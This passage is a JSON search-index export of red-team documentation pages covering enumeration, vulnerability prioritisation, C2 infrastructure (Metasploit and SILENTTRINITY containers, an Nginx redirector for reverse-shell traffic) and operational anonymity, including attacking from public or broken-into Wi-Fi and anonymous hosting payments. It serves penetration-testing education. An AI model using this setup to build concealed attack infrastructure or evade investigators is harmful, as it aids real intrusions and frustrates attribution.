    "c": "Prioritisation of vulnerabilities  Asset categorisation — how critical is the system that has vulnerabilities? Adjudication — making a decision on whether the vulnerability discovered is a false positive. Review and validate. Prioritisation of vulnerabilities — if a vulnerability exploits confidentiality, integrity, or availability, then that vulnerability would typically take priority. Common Vulnerability Scoring System (CVSS)  Advantages  CVSS has been around for a long time. CVSS is popular in organisations. CVSS is a free framework to adopt and recommended by organisations such as NIST. Disadvantages  CVSS was never designed to help prioritise vulnerabilities, instead, just assign a value of severity. CVSS heavily assesses vulnerabilities on an exploit being available. Only 20% of all vulnerabilities have an exploit available ( Tenable., 2020 ). Vulnerabilities rarely change scoring after assessment despite the fact that new developments such as exploits may be found. Vulnerability Priority Rating (VPR)  Advantages  VPR is a modern framework that is real-world. VPR considers over 150 factors when calculating risk. VPR is risk-driven and used by organisations to help prioritise patching vulnerabilities. Scorings are not final and are very dynamic, meaning the priority a vulnerability should be given can change as the vulnerability ages. Disadvantages  VPR is not open-source like some other vulnerability management frameworks. VPR can only be adopted separate from a commercial platform. VPR does not consider the CIA triad to the extent that CVSS does; meaning that risk to the confidentiality, integrity and availability of data does not play a large factor in scoring vulnerabilities when using VPR. Real Risk Score (RRS)  Real Risk Score (RRS) may offer a good alternative. It enriches CVSS data to provide a more precise risk score.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "f9f57e43799169b1563d26179028d219",
    "u": "https://enum.tymyrddin.dev/docs/app/scanning",
    "t": "Dynamic web application scanning ",
    "c": "Dynamic web application scanning  Features of the two main web application scanners (community versions): Feature Burp Suite Community Edition OWASP ZAP Burp Suite Pro Web Application Scanning Not Available Available with basic security vulnerabilities Available with quality security vulnerabilities Intercepting Feature Available Available Available Fuzzing Capabilities Available Available Available Encoder and Decoder Available Not Available Available Cost Free Free Paid Subscription Advanced Functionality ($450 per year) Documentation Extensive Little Extensive Spider Available Available Available Updates Available Available Available Extensions Less Options No provision for enhance functionality Available Coverage Medium coverage Less coverage Extensive Coverage False Positive Less More Less Session Token Entropy Analysis Available Not Available Available Comparison Feature Available Not Available Available",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "d60a0f3306d489a4438058abb064816a",
    "u": "https://enum.tymyrddin.dev/docs/vulns/more",
    "t": "Discovering more vulnerabilities/exploits ",
    "c": "Discovering more vulnerabilities/exploits  Attack tree  1 Known vulnerabilities/exploits (AND) 1.1 Look up in Exploit databases 1.2 Vulnerability scanning 2 Latent vulnerabilities (AND) 2.1 Security code reviews 2.2 Specific code scanning for vulnerabilities 3 New vulnerabilities 3.1 Root cause analysis 3.2 Variant analysis 3.3 Patch analysis 3.4 Exploit technique analysis 4 New exploits 4.1 Proof-of-concept development (exploit development) 4.2 Cross-compiling 4.3 Modifying an existing exploit 4.4 A new exploit chain (a new on-path) Notes  Manual security code reviews  Manual security code reviews are usually performed by developers or security experts. Such efforts usually take place during a security push or pentesting engagement and are associated with a final security review. Coding errors can be found using different approaches, but even when compared to sophisticated tools, manual code reviews have clearly proven their value in the areas of precision and quality. Unfortunately, manual code reviews are also the most expensive to execute. It is important the developers are not part of the team that created the code, and a facilitator/security professional is also a good idea. New vulnerabilities  New vulnerabilities are usually found through bug bounty programs, or researched by dedicated groups like Google Project Zero. New exploits  Developing your own exploit is a great way to demonstrate proof of concept that the exploit can happen without focusing on performing malicious activity on the target system. Cross-compiling by downloading the source code of an existing exploit and compiling it for another platform. Modifying the exploit to fit your needs before compiling the exploit is also a good option. Exploit chaining uses a combination of different exploits run one after the other. Resources known vulnerabilities  0-days In-the-Wild Blackhat 2020: Reversing the Root (pdf of slides)",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "55e2a7ec52f92c0d92359d62332a0fd3",
    "u": "https://enum.tymyrddin.dev/docs/system/cloud",
    "t": "Scanning cloud infrastructure ",
    "c": "Scanning cloud infrastructure  Most internet resources on cloud providers, like load balancers, content distribution networks, S3 buckets, etc., regularly rotate their IP addresses. If the nmap takes too long, the addresses will have been assigned to another customer and the results will no longer be relevant. Scan domain names, not IP addresses. nmap -F -sV -iL domains.txt -oA results Spotting hidden relationships  Consider the core business and what other servers and datastores there are likely to be. Keep an eye open for information that might indicate where to find those.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "54522f627bbdd621763a16e528931aea",
    "u": "https://enum.tymyrddin.dev/docs/system/ntp",
    "t": "NTP enumeration ",
    "c": "NTP enumeration  An attacker can enumerate the following information by querying an NTP server. List of hosts connected to the NTP server Internal client IP addresses, hostnames and operating system used Tools  NTP enumeration tools Remediation  Restrict the usage of NTP and enable the use of NTPSec, where possible. Filter the traffic with IPTables. Enable logging for the messages and events.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "87c7f8b3aca09a9b29a4f4d7273e785b",
    "u": "https://enum.tymyrddin.dev/docs/vulns/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Discover vulnerabilities: Known vulnerabilities are the simplest vulnerabilities which have been discovered and disclosed. These are often found in the libraries and frameworks that are part of an application. These vulnerabilities tend to get hit very quickly (hours) after disclosure by automated attacks from all over the world, so response speed is critical. Latent vulnerabilities are instances of typical vulnerability classes.: buffer overflows, cross-site scripting (XSS) and SQL injection for example.These vulnerabilities are not listed in databases – these are unique to each application. New vulnerabilities represent a new class of vulnerability. These appear at a slow rate, maybe one or two per year. After discovery, research and confirmations, these turn into latent vulnerabilities. There is a learning curve on these new vulnerabilities for attackers and defenders. This type of research is expensive and for most companies unlikely to produce much payoff in terms of overall risk reduction. Why?  To compromise the security of the system and potentially gain full access to the system. How?  Mapping vulnerabilities to exploits Prioritisation of vulnerabilities Discovering more vulnerabilities/exploits",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "36d98026c869ed6b8d5fb4b4f6dc6d45",
    "u": "https://enum.tymyrddin.dev/docs/system/ldap",
    "t": "LDAP enumeration ",
    "c": "LDAP enumeration  LDAP supports anonymous remote queries on the server. The query will disclose sensitive information such as usernames, address, contact details, etc. Tools  LDAP enumeration tools Remediation  Use SSL to encrypt LDAP communication Use Kerberos to restrict the access to known users Enable account lockout to restrict brute-forcing Create a few Active Directory Decoy accounts Enable auditing on those accounts Run Bloodhound’s Sharphound tool Perform LDAP Reconnaissance activities within the active directory environment Detect the activities in Windows event logs.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "107794ffefe7d0da979c234ae03f2a2e",
    "u": "https://enum.tymyrddin.dev/docs/app/binaries",
    "t": "Download or obtain and decompile binaries ",
    "c": "Download or obtain and decompile binaries  Download or obtain binaries and then use a decompiler to analyse the binary . Review the application in a debugger. Look for information such as remote systems the application connects to, database connection strings, or usernames and passwords used by the application (there may be a backdoor).",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "cb6e186f91b8d4679c6f5a5c847724c8",
    "u": "https://enum.tymyrddin.dev/docs/system/linux",
    "t": "Linux enumeration ",
    "c": "Linux enumeration  Get information from: Settings: Users and usernames Applications: some run on defaults, or there may be null or blank passwords Permissions on key directories and files Shares if linux shares resources over the network Samba, the linux equivalent to smb, may give information about the windows network and its shares NFS information can give information on permissions and the network services Network services such as DNS , LDAP , SMTP , etc. Various built-in commands and utilities Tools  Linux enumeration tools Remediation  Minimize the attack surface by removing any unnecessary or unused service. Ensure IPTables is configured to restrict the access.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "90a4cd9ec2bd9e8e4a00397f11ccfa44",
    "u": "https://enum.tymyrddin.dev/docs/system/smtp",
    "t": "SMTP enumeration ",
    "c": "SMTP enumeration  SMTP provides three built-in commands: VRFY: Validate users on the SMTP servers EXPN: Delivery addresses of aliases and mailing lists RCPT TO: Defines the recipients of the message SMTP servers respond differently to the commands mentioned above, and SMTP enumeration is possible due to varied responses. Attackers can determine the valid users on the SMTP servers with the same technique. Tools  SMTP enumeration tools Remediation  Ignore email responses from unknown recipients. Disable open relay functionality. Prune any sensitive information like mail server and localhost in the mail responses.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "e51a3a5b7a01adf9feec37ef369c98d7",
    "u": "https://enum.tymyrddin.dev/docs/system/windows",
    "t": "Windows enumeration ",
    "c": "Windows enumeration  Get information: Usernames Default configurations Default passwords Domain names Computer names Shares Windows information Network information like DNS , SMTP , SNMP information Application details Banners Routing tables Tools  Windows enumeration tools Remediation  Minimize the attack surface by removing any unnecessary or unused service. Ensure IPTables is configured to restrict the access.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "517b315e6fd40e47e801db5896d51370",
    "u": "https://enum.tymyrddin.dev/docs/system/macos",
    "t": "macOS enumeration ",
    "c": "macOS enumeration  Get information from: Settings: Users and usernames Applications: some run on defaults, or there may be null or blank passwords Permissions on key directories and files Shares if macOS shares resources over the network Samba, the linux equivalent to smb, may give information about the windows network and its shares NFS information can give information on permissions and the network services Network services such as DNS , LDAP , SMTP , etc Various built-in commands and utilities Tools  macOS enumeration tools Remediation  Minimize the attack surface by removing any unnecessary or unused service. Ensure IPTables is configured to restrict the access.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "7a7948d45c2b893ccde3bfea260a6c84",
    "u": "https://enum.tymyrddin.dev/docs/app/database",
    "t": "Enumerate databases ",
    "c": "Enumerate databases  Gather information using database enumeration tools : Find a page url with a GET request parameter Test different SQL injection methods against the request parameter List information about the existing databases List information about tables present in a particular database List information about the columns of a particular table Dump the data",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "167124ae5bf3c44da18ff419f98dfcf3",
    "u": "https://enum.tymyrddin.dev/docs/system/virtual",
    "t": "Scanning virtualised systems ",
    "c": "Scanning virtualised systems  Some systems may be running on virtual machines or containers. Depending on the configuration of the virtualisation environment, it may not be possible to communicate with some virtual machines and containers if they are not connected to the network or are configured to network with one another, but not the real network. In this scenario, set up a virtual machine to connect to the private virtual machine network to do a vulnerability scan or look for vulnerability scanners that can have an agent installed in the virtual machines to be scanned.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "e8b808f9d750cbb9239bf279386fb2dc",
    "u": "https://enum.tymyrddin.dev/docs/system/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  System enumeration is a process of connecting to and interrogating a network or system to retrieve information about that network or system. Take information already gathered during reconnaissance (like IP addresses) and during scanning (open ports) and gather as much data about the targets and services running on the targets, using a variety of techniques and tools. Why?  To discover potential attack vectors in the system, and further exploitation of the system. Items of great interest: Network services that are running but not in use. Default user accounts that have no passwords. User accounts that have a revealed password. Guest accounts that are active. Security tokens. How?  NetBios enumeration SNMP enumeration LDAP enumeration NTP enumeration SMTP enumeration DNS enumeration macOS enumeration Linux enumeration Windows enumeration Scanning virtualised systems Scanning cloud infrastructure",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "195074c36ef3d11280205131dacbb0de",
    "u": "https://iac.tymyrddin.dev/",
    "t": "A foothold in the cloud ",
    "c": "A foothold in the cloud  The red team performs real-world attacks. For that we have to pretend to be adversaries that do not wish to be detected no matter what. Redirectors can be used to proxy requests coming from the target back to our attack infrastructure. A solution with bounce servers is much more elegant and replacing infrastructure components can be done in minutes. And automating the server set up process like this also helps in exploring current DevOps methodologies to better understand the underlying technologies. Redirectors Introduction Bounce servers Introduction Anonymous payments Major providers Resources Alternative providers Frontend Introduction Infrastructure frontend IP masquerading Backends Introduction  C2’s Landslides Metasploit container SilentTrinity container Automation Introduction Spawning containers Set up terraform Set up AWS on bouncer Attack machines Introduction Using a VPN Pick a sound location Use an ephemeral OS Use an attack server",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "471e9553bc9469a216ea129ca7ca4fbe",
    "u": "https://iac.tymyrddin.dev/docs/frontend/nginx",
    "t": "Infrastructure frontend ",
    "c": "Infrastructure frontend  The attack infrastructure frontend interacts with the target and must be unique to each operation or target, and replaced every few days. To “dockerize” the Nginx server that routes calls to either Metasploit or SilentTrinity according to the URL’s path, use Staticfloat’s Nginx setup with SSL certificates generated by Let’s Encrypt with some adaptations. Dockerfile to set up an Nginx server with a Let’s Encrypt certificate in ~/nginx/Dockerfile . # The base image with scripts to configure Nginx and Let's Encrypt FROM staticfloat/nginx-certbot # Copy a template Nginx configuration COPY *.conf /etc/nginx/conf.d/ # Copy phony HTML web pages COPY --chown=www-data:www-data html/* /var/www/html/ # Small script that replaces __DOMAIN__ with the ENV domain value, same for IP COPY init.sh /scripts/ ENV DOMAIN=\"www.customdomain.com\" ENV C2IP=\"192.168.1.29\" ENV CERTBOT_EMAIL=\"barzh@protonmail.com\" CMD [\"/bin/bash\", \"/scripts/init.sh\"] Cheatsheets  Docker cheatsheet",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "67c9278489132a54566d4d99da929268",
    "u": "https://iac.tymyrddin.dev/docs/backends/metasploit",
    "t": "Metasploit container ",
    "c": "Metasploit container  For Linux and macOS targets. Installation  Install Docker Desktop on Linux Pull the phocean/msf Docker image The image contains Metasploit files, binaries, and dependencies that are already compiled and ready to go. Run it: docker run --rm -it phocean/msf The --rm option deletes the container upon termination to clean up resources. The -it option allocates a pseudoterminal and links to the container’s stdin device to mimic an interactive shell. Start Metasploit using the msfconsole command: :/opt/metasploit-framework# ./msfconsole Preps for connecting to the frontend  When starting a container, Docker automatically creates a pair of virtual Ethernet devices. One end is assigned the new namespace, where it can be used by the container to send and receive network packets. The other connector is assigned the default namespace and is plugged into a network switch that carries traffic to and from the external world. Linux calls this virtual switch a network bridge. An ip addr | grep \"docker0\" on the ubuntu host machine shows the default docker0 bridge with the allocated 172.17.0.0/16 or 172.17.0.0/16 IP range ready to be distributed across new containers. Every container gets its dedicated veth pair, and therefore IP address, from the docker0 bridge IP range. $ sudo docker run --rm \\ -it -p 8400-8500:8400-8500 \\ -v ~/.msf4:/root/.msf4 \\ -v /tmp/msf:/tmp/data \\ phocean/msf A handler listening on any port between 8400 and 8500 inside the container can be reached by sending packets to the host’s IP address on that same port range. Mapping the ~/.msf4 and /tmp/msf directories on the host to directories in the container, /root/.msf4 and /tmp/ data is for persisting data across multiple runs of the same Metasploit container. To send the container to the background, press CTRL-P followed by CTRL-Q . Or send it to the background from the start by adding the -d flag. To get inside again, execute a docker ps , get the Docker ID, and run docker attach <ID> . Or run the docker exec -it <ID> sh command.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "1c21f1d3a8256b047f8320d4bf164cb0",
    "u": "https://iac.tymyrddin.dev/docs/backends/c2s",
    "t": "About C2’s ",
    "c": " C2’s  One could view BeEF as a C&C, but … BeEF is a tool designed to provide effective client-side attack vectors and to exploit any potential vulnerabilities in the web browser. Ideal for demonstrating and explaining these attack vectors. It is unique among the C&C frameworks because it does not try to tackle the more secure network interface aspects of a system. These C&C’s can. With enough time later, we can give BYOB or Merlin a whirl. Centralised C2  With a centralised command and control model, a malware “client” will phone home to a C2 server and check for instructions. The server-side infrastructure can include redirectors, load balancers, and defense measures to detect security researchers and law enforcement. Public cloud services and Content Delivery Networks (CDNs) are often used to host or mask activity. The domains and servers can be removed within hours of their first use, and the malware is often coded with a list of different C2 servers to try and reach. P2P C2  In a P2P C2 model, command and control instructions are delivered to members of a botnet relaying messages between one another. Some nodes can function as server, but there is no central or master node. This makes it harder to detect or disrupt than a centralised model but can also make it more difficult to issue instructions to the entire botnet. P2P networks can be used as a fallback mechanism in case the primary centralised C2 channel is disrupted. Out of Band  Twitter, Gmail, IRC chat rooms, and even Pinterest can be used to issue C&C messages to compromised hosts. Random  Command and control infrastructure can even be random, and use scanning the Internet to find an infected host. This is extremely hard to take down. C2 Frameworks  BYOB <= Cobalt Strike Covenant Empire Koadic <= Metasploit Merlin <= Sillenttrinity Documentation and support  BYOB (Build Your Own Botnet) Wiki BYOB Discord support server Merlin documentation Articles  MITRE | ATT&CK Command and Control Using Merlin agents to evade detection",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "267b7a1bee138fbcd04351e348e3cc1a",
    "u": "https://iac.tymyrddin.dev/docs/automation/aws",
    "t": "Set up AWS on bouncer ",
    "c": "Set up AWS on bouncer  EC2 is the AWS service managing machines, networks, load balancers, etc. Create an AWS account and an IAM user to create a programmatic account for username terraform and grant it full access to all EC2 operations by attaching the AmazonEC2FullAccess policy. Download the credentials as a .csv file. Note the Access key ID and Secret access key . Download the AWS command line tool and save your credentials: root@Bouncer:~/# apt install awscli root@Bouncer:~/# aws configure AWS Access Key ID [None]: XXXXXXXXXXXXXXXXXXX AWS Secret Access Key [None]: XXXXXXXXXXXXXXXXXXXXXX... Default region name [None]: eu-west-1 Set up a folder to host the infrastructure’s configuration: root@Bouncer:~/# mkdir infra && cd infra Create two files: provider.tf and main.tf : # provider.tf provider \"aws\" { region = \"eu-west-1\" version = \"~> 2.28\" } Check all the prepared Ubuntu images for your region and choose your aws_instance resource for Terraform to spawn a server using the main.tf file: # main.tf resource \"aws_instance\" \"basic_ec2\" { ami = \"ami-0f66b05137bbada09\" instance_type = \"hvm:ebs-ssd\" } Save main.tf and initialize Terraform for it to download the AWS provider: root@Bounce:~/infra# terraform init",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "80e68affde52a13cd8b185adca42292d",
    "u": "https://iac.tymyrddin.dev/docs/backends/silenttrinity",
    "t": "SilentTrinity container ",
    "c": "SilentTrinity container  For Windows targets Dockerfile to start the SILENTTRINITY team server ~/SILENTTRINITY/Dockerfile # The base Docker image containing binaries to run Python 3.7 FROM python:stretch-slim-3.7 # Install git, make, and gcc tools RUN apt-get update && apt-get install -y git make gcc # Download SILENTTRINITY and change directories RUN git clone https://github.com/byt3bl33d3r/SILENTTRINITY/ /root/st/ WORKDIR /root/st/ # Install the Python requirements RUN python3 -m pip install -r requirements.txt # Inform future Docker users that they need to bind port 5000 EXPOSE 5000 # ENTRYPOINT is the first command the container runs when it starts ENTRYPOINT [\"python3\", \"teamserver.py\", \"0.0.0.0\", \"stringpassword\"] To pull the base image, populate it with the tools and files we mentioned, and name the resulting image silent: # docker build -t silent . Start the newly built image in the background using the -d switch: root@tardis:~/# docker run -d \\ -v /opt/st:/root/st/data \\ -p5000:5000 \\ silent Connect to the team server running on the container: root@tardis:~/# python3.7 st.py \\ wss://username:strongPasswordCantGuess@192.168.1.29:5000 To be able to download it from any workstation, push it to a Docker repository: root@tardis:~/# docker login Username: barzh Password: Login Succeeded root@tardis:~/# docker tag silent barzh/silent root@tardis:~/# docker push barzh/silent The SILENTTRINITY Docker image can now be pulled for running on any Linux machine spawned in the future.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "de577c1fe43ec75bf4dd7751f950d008",
    "u": "https://iac.tymyrddin.dev/docs/automation/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Infrastructure as code uses the idea of having a full declarative description of the components that should be running at any given time, from the name of the machine to the last package installed on it. A tool then parses this description file and corrects any discrepancies observed, such as updating a firewall rule, changing an IP address, attaching more disk, or whatever is needed. If the resource disappears, it’s brought back to life to match the desired state. Here we use AWS and Terraform. Why?  Maintenance takes little time, and we can focus on the pentesting/red teaming itself. Terraform is open source and supports a number of cloud providers , which makes it the best choice if you chose an alternative provider that accepts Zcash. How?  AWS Download Terraform in bouncing server Spawning containers",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "0c7e8ce569e38a679f95b23afef1742c",
    "u": "https://iac.tymyrddin.dev/docs/attack/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  The security of the tooling, the anonymity of the infrastructure, and how-to-stay-safe is becoming ever more important. Why?  We will need stealth to not be detected by the blue team. And, for that matter, better protection from the ever-increasingly authoritarian world we seem to be forging for ourselves. How?  Choose carefully when using a VPN Pick a sound location to attack from Use an ephemeral OS Use an attack server",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "c36a32ddcf59aa5769f15ad3d8c62ea3",
    "u": "https://iac.tymyrddin.dev/docs/attack/location",
    "t": "Pick a sound location ",
    "c": "Pick a sound location  Whether using Tor or VPN services, always assume that your IP address, thus your geographical location and/or browser fingerprint is known to intermediaries and can be discovered by the target or anyone investigating on their behalf. Use public gathering places (train stations, libraries) that have public Wi-Fi to quietly conduct operations. Just another dot in the big data stream. Not the same place. Visit new locations and even change city on occasion. Maybe even country. War driving is an option in locations with many surveillance cameras. A typical Wi-Fi receiver of a free public hotspot (or one that is poorly secured, and you can break into) can catch a signal up to 40 meters away, which can be increased with a directional antenna. Resources  WiFi map",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "1ee37fe55fcedcd69a96031fe1285a34",
    "u": "https://iac.tymyrddin.dev/docs/attack/server",
    "t": "Use an attack server ",
    "c": "Use an attack server  An alternative to using an ephemeral OS with a bounce server , is setting up a front-line VPS attack server on a cloud provider that accepts anonymous payments . Configure firewall rules to allow SSH traffic from our current public IP, whether that’s a Wi-Fi hotspot at a suitable location . Once the machine is up, connect to it using SSH. Install the necessary tools .",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "688fabeebc73ac2a54185f06ce7ba647",
    "u": "https://iac.tymyrddin.dev/docs/bouncers/alt-providers",
    "t": "Alternative providers ",
    "c": "Alternative providers  Several alternative providers that accept anonymous payments exist. Resources  NiceVPS costs €15.99 a month for a server with 1GB of memory and one vCPU core. Cryptocurrency accepted Hosting, VPS, Anonymous Domain Cinfu costs between €4 and around €5 a month (depending on country, Bulgaria, Netherlands, France, Germany, and availability) for a server with 2GB of memory and one vCPU core. Payment Options PiVPS costs about $4.99 a month for a server with 1GB of memory and one vCPU core. They support most major payment gateways, including Bitcoin, PerfectMoney, Skrill (Moneybookers), 2checkout (Credit/Debit Card), PAYEER and OKpay.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "1c0d7acbca997c4e71095f1e4571ae5b",
    "u": "https://iac.tymyrddin.dev/docs/backends/landslides",
    "t": "Landslides ",
    "c": "Landslides  Metasploit  For the best part of the last decades the undefeated champion of C2 frameworks was the Metasploit framework, but the default settings of the tool have been flagged by every Windows security product since 2007. For hacking Linux PC’s it can still be a good choice. It includes many community-contributed modules for attack, useful for most phases of penetration testing, including reconnaissance, vulnerability identification, exploitation, and command and control. Empire  Empire and its later version BC-security Empire is a PowerShell exploitation framework. The Empire framework provides an exhaustive list of modules, exploits, and lateral movement techniques specifically designed for Active Directory. Many of the tools still work, and are still used in practice. These tools are very likely to be detected in advanced environments unless additional methods of concealment (using PowerPick or obfuscation techniques) are also used. The framework includes many PowerShell scripts and modules designed for gathering credentials (running Mimikatz), discovery and reconnaissance, privilege escalation, lateral movement, and persistence, etc. Empire is no longer maintained by the original team, and BC Security, released version 3.0 in December 2019. The framework assumes that PowerShell allows attackers unhindered access to the environment. As of Windows 10, with PowerShell block logging and AMSI, this is no longer the case. Covenant  Covenant is a .NET C2 framework designed for collaboration during an attack operation. SilentTrinity  SilentTrinity is a modern, asynchronous, multiplayer & multiserver C2/post-exploitation framework powered by Python 3 and .NETs DLR.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "059b95072485b8bd8243485f2ebffdf9",
    "u": "https://iac.tymyrddin.dev/docs/frontend/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  The attack infrastructure frontend interacts with the target. Why?  The frontend initiates connections to the target, scans machines, and routes incoming packets from a reverse shell through a web proxy to deliver them to a backend systems, a C2 framework like Metasploit or SilentTrinity. This packet routing can be done with a regular web proxy like Nginx or Apache that acts as a filter: requests from infected computers are routed to the corresponding backend C2, while the remaining requests are displayed an innocent web page. It must be unique to each operation or target, and be quickly replacable every few days. How?  The Nginx web server can be tuned relatively quickly. IP masquerading",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "545a9d4f683b69f1a0296e55bcece6c9",
    "u": "https://iac.tymyrddin.dev/docs/attack/ephemeral",
    "t": "Use an ephemeral OS ",
    "c": "Use an ephemeral OS  For red teaming, use an ephemeral operating system that flushes everything away on every reboot. Store this OS on a USB stick, and whenever a nice spot is found, plug it into the computer and boot from it. Tails is an excellent Linux distribution for this purpose. It automatically rotates the MAC address, forces all connections to go through Tor, and avoids storing data on the laptop’s hard disk. If you do wish to keep some data, make sure to encrypt that data and store it on portable storage.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "5a4f543ad22421a6fa23b4197f0153c2",
    "u": "https://iac.tymyrddin.dev/docs/bouncers/payments",
    "t": "Anonymous payments ",
    "c": "Anonymous payments  Cryptocurrency  Cryptocurrency is only “anonymous” as long as you keep your crypto wallet separate from your identity. Achieving privacy with cryptocurrency requires a lot of extra steps and vigilance. Like, not giving any real personal data for the service. And it will only get harder to achieve in the future. Banks and governments have regulated currency for centuries. Cryptocurrency is decentralised and does not belong to a single entity, and governments are either forbidding its use or have started imposing regulations. And will likely up their game, using arguments related to cybersecurity. Prepaid debit cards  This may not be a problem, as there may be services that provide prepaid debit cards in exchange for cash. Have not found and tried such cards in Europe. But I’m looking … Resources  Zcash",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "318acb1064791cd4117ae69585995655",
    "u": "https://iac.tymyrddin.dev/docs/bouncers/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Bouncing servers are virtual hosts set up anonymously, to SSH into after connecting to via Tor or a VPN, and trust to interact with the rest of our attack infrastructures, but never interact with the target. Delete and re-create bouncing servers every few weeks. Limitation is the payment solution supported by the providers. Why?  Bouncing servers are used to host management tools like Terraform, Docker, and Ansible to support multiple attack infrastructures. Although the servers never interact with the target, they can be associated with those parts of our attack infrastructures that do. Virtual servers (VPS) can be hosted on one or many cloud providers spread across many geographical locations. How?  Major cloud providers Research anonymous payments Alternative cloud providers",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "b14ff79f38578d30a6d2aac0d47ba371",
    "u": "https://iac.tymyrddin.dev/docs/automation/containers",
    "t": "Spawning containers ",
    "c": "Spawning containers  Whichever cloud provider we chose and whatever Linux distribution they host, as long as there is Docker support, we can spawn the fully configured C2 backends using a couple of command lines. The Metasploit and SilentTrinity containers can run on the same host, but the Nginx container must run on a separate host. If the IP or domain gets flagged, respawn a new host and run a docker run command. Twenty seconds later, we have a new domain with a new IP routing to the same backends. The following will run our Metasploit container: root@tardis:~/# docker run -dit \\ -p 9990-9999:9990-9999 \\ -v $HOME/.msf4:/root/.msf4 \\ -v /tmp/msf:/tmp/data phocean/msf And this will run the SILENTTRINITY container: root@tardis:~/# docker run -d \\ -v /opt/st:/root/st/data \\ -p5000-5050:5000-5050 \\ barzh/silent Launching the fully functioning Nginx server that redirects traffic to the C2 endpoints (The DNS record of www.<customdomain>.com should already point to the server’s public IP for this to work.: root@enterprise:~/# docker run -d \\ -p80:80 -p443:443 \\ -e DOMAIN=\"www.customdomain.com\" \\ -e C2IP=\"192.168.1.29\" \\ -v /opt/letsencrypt:/etc/letsencrypt \\ barzh/nginx",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "696ea561d13b5b3340710bd69f8b6372",
    "u": "https://iac.tymyrddin.dev/docs/attack/vpn",
    "t": "Using a VPN ",
    "c": "Using a VPN  Using a VPN service that promises total anonymity, while having registered using your IP address, credit card, and your name and address? And using it for other stuff as well, like sites where you have registered? No matter what a VPN service claims, there is always some form of logs: IP address, DNS queries, active sessions, etc. Without logs of some sort, the service becomes unmanagable. Most countries have laws forcing every access provider to keep basic metadata logs of outgoing connections (which IP address talked to which IP, using which protocol, at which time, etc.), and it is highly unlikely your VPN provider will infringe the law. Perhaps they do not sell customer data to the highest bidder. Recommendation  ProtonVPN is based in Switzerland, which has some of the strongest data protection and digital privacy laws in the world. Data required for maintenance and troubleshooting purposes is secured using full-disk encryption on their bare-metal servers. Articles  India tells VPN, cloud, and crypto companies to collect user data or face imprisonment",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "05457a6cb20c85d8e092e934078ebc0c",
    "u": "https://iac.tymyrddin.dev/docs/redirectors/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Redirectors proxy requests coming from the target back to our attack infrastructure. Why?  Reusing IP addresses will immediately attract attention of someone on the blue team If the IP address of a C2 server controlling dozens of machines on a target is blacklisted, we must be able to roll out a new server in a matter of seconds with a fresh IP to receive new connections, without interrupting ongoing jobs not subject to the IP ban. We need to be able to serve multiple clients/targets. Too much from one IP address makes for suspicions. How?  Set up a redirector for each specific operation. Note the solution with bounce servers is much more elegant and quick. Professor-plum/Presentations",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "d9f21184fcfab2201c877e6a2f2b9f52",
    "u": "https://physical.tymyrddin.dev/",
    "t": "A pocketful of acorns ",
    "c": "A pocketful of acorns  Physical security involves controlling who has physical access to the facility, the servers, network equipment, andend-user devices. A physical penetration test can assess all physical security controls, including locks, fences, security guards, cameras, and other security measures. The test attempts to bypass the security controls to gain physical access to restricted areas, identify sensitive data, and gain entry to networks. These types of tests tend to be expensive, and the easy stuff for fixes do not require a physical test to know one needs to improve locks, entry/exit controls to prevent tailgating, securing network ports from intruders with physical locks or network access controls, etc. The exception is the social engineering part, in particular phishing simulations, an often used attack by real attackers, with serious consequences. Testlab Additional hardware Social engineering Preparation Reconnaissance Exploiting physical security Introduction Badge cloning Getting through doors without a badge Social engineering Introduction Get people to talk USB key drop",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "29913e6484d52439dc5dfe34098f01ff",
    "u": "https://physical.tymyrddin.dev/docs/opsec/talk",
    "t": "Get people to talk ",
